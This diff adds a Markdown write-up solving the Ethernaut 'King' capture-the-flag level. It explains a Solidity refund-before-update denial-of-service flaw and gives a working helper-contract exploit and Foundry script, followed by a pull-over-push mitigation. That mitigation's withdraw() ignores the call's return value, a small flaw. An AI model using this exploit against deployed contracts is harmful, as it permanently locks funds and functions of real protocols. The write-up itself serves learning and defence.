@@ -1,0 +1,279 @@
+# Ethernaut Level 9 – King
+
+## Overview
+
+The objective of this challenge is to become the new king and permanently prevent anyone else from reclaiming the throne.
+
+At first glance, becoming the king is straightforward—simply send more Ether than the current prize. However, the real vulnerability lies in how the contract refunds the previous king.
+
+The contract uses `transfer()` to immediately send Ether back to the current king before updating the state. If the current king is a contract that cannot receive Ether, the refund fails, causing the entire transaction to revert. As a result, no one can ever become king again.
+
+---
+
+# Vulnerable Contract
+
+The critical logic is:
+
+```solidity id="q8z3bv"
+require(
+    msg.value >= prize || msg.sender == owner,
+    "Need to pay more to become king"
+);
+
+payable(king).transfer(msg.value);
+
+king = msg.sender;
+prize = msg.value;
+```
+
+Whenever a new player attempts to become king:
+
+1. The contract refunds the current king.
+2. The refund uses `transfer()`.
+3. Only after a successful refund does it update the new king.
+
+This dependency creates a denial-of-service vulnerability.
+
+---
+
+# Root Cause
+
+The vulnerability comes from using:
+
+```solidity id="b4r09o"
+payable(king).transfer(msg.value);
+```
+
+`transfer()` automatically reverts if the recipient cannot receive Ether.
+
+If the current king is a contract with **no payable `receive()` or `fallback()` function**, the refund fails and the entire transaction reverts.
+
+Because the refund occurs **before** updating the king, ownership of the throne becomes permanently locked.
+
+---
+
+# Understanding the Attack
+
+Normally, the execution flow looks like this:
+
+```text id="u91jif"
+New Challenger
+        │
+        ▼
+Send Enough ETH
+        │
+        ▼
+Refund Current King
+        │
+        ▼
+Refund Succeeds
+        │
+        ▼
+Update King
+```
+
+The attack changes only one thing:
+
+The current king becomes a contract that rejects every incoming Ether transfer.
+
+Now the flow becomes:
+
+```text id="g5xljm"
+New Challenger
+        │
+        ▼
+Send Enough ETH
+        │
+        ▼
+Refund Current King
+        │
+        ▼
+Transfer Reverts
+        │
+        ▼
+Entire Transaction Reverts
+        │
+        ▼
+King Never Changes
+```
+
+The throne is effectively locked forever.
+
+---
+
+# Exploit
+
+First, deploy a helper contract that has **no payable `receive()` or `fallback()` function**.
+
+```solidity id="gqq2zg"
+contract HelperContract {
+    function attack(address payable target, uint256 prize)
+        external
+        payable
+    {
+        (bool success,) = target.call{value: prize}("");
+        require(success, "failed to become king");
+    }
+}
+```
+
+Because the helper contract cannot receive Ether, any future refund attempt using `transfer()` will revert.
+
+The exploit script becomes:
+
+```solidity id="lm7yyr"
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    uint256 prize = kingInstance.prize();
+
+    HelperContract attacker = new HelperContract();
+
+    attacker.attack{value: prize}(
+        payable(address(kingInstance)),
+        prize
+    );
+
+    vm.stopBroadcast();
+}
+```
+
+Once the helper contract becomes king, the level owner—or any other user—can no longer reclaim the throne.
+
+---
+
+# Why No `receive()` Matters
+
+The helper contract intentionally omits:
+
+```solidity id="zmjlwm"
+receive() external payable {}
+
+fallback() external payable {}
+```
+
+Without either function, any attempt to send Ether using `transfer()` automatically reverts.
+
+Since the `King` contract depends on a successful refund before updating ownership, the contract becomes permanently stuck.
+
+---
+
+# Attack Flow
+
+```text id="s3dxsq"
+Deploy Helper Contract
+        │
+        ▼
+Helper Sends Prize ETH
+        │
+        ▼
+Helper Becomes King
+        │
+        ▼
+Future Challenger Sends ETH
+        │
+        ▼
+King Tries refunding Helper
+        │
+        ▼
+transfer() Reverts
+        │
+        ▼
+Entire Transaction Reverts
+        │
+        ▼
+Helper Remains King Forever
+```
+
+---
+
+# Security Impact
+
+This vulnerability results in a **Denial of Service (DoS)**.
+
+A malicious contract can permanently block important protocol functionality simply by refusing incoming Ether.
+
+Similar issues have historically affected:
+
+* Auction contracts
+* Governance systems
+* Payment queues
+* Treasury distributions
+* Reward mechanisms
+
+Any protocol that depends on pushing Ether to arbitrary addresses is exposed to this class of attack.
+
+---
+
+# Recommended Mitigation
+
+Avoid pushing Ether to users during state-changing operations.
+
+Instead, implement the **Pull over Push** payment pattern.
+
+Instead of:
+
+```solidity id="wsljlwm"
+payable(king).transfer(msg.value);
+```
+
+record the payment:
+
+```solidity id="gbyjlwm"
+pendingWithdrawals[king] += msg.value;
+```
+
+Then allow users to withdraw their funds separately:
+
+```solidity id="tvjlwm"
+function withdraw() external {
+    uint256 amount = pendingWithdrawals[msg.sender];
+    pendingWithdrawals[msg.sender] = 0;
+    payable(msg.sender).call{value: amount}("");
+}
+```
+
+This removes the dependency on external contract behavior during critical state updates and prevents a malicious recipient from blocking protocol execution.
+
+---
+
+# Key Takeaways
+
+* `transfer()` can revert when sending Ether to contracts that cannot receive it.
+* External calls made before updating state can introduce denial-of-service vulnerabilities.
+* Never assume the recipient of Ether is an Externally Owned Account (EOA).
+* Follow the **Pull over Push** payment model whenever possible.
+* External interactions should be carefully designed to avoid allowing one participant to block protocol functionality.
+
+---
+
+# Exploit Summary
+
+```solidity id="mqjlwm"
+contract HelperContract {
+    function attack(address payable target, uint256 prize)
+        external
+        payable
+    {
+        (bool success,) = target.call{value: prize}("");
+        require(success, "failed to become king");
+    }
+}
+
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    uint256 prize = kingInstance.prize();
+
+    HelperContract attacker = new HelperContract();
+
+    attacker.attack{value: prize}(
+        payable(address(kingInstance)),
+        prize
+    );
+
+    vm.stopBroadcast();
+}
+```
+
+The exploit deploys a helper contract that intentionally cannot receive Ether. After becoming the new king, any subsequent attempt to reclaim the throne causes the `King` contract to refund the current king using `transfer()`. Since the helper contract rejects the transfer, the refund reverts, causing the entire transaction to fail and permanently locking the helper contract as the king.
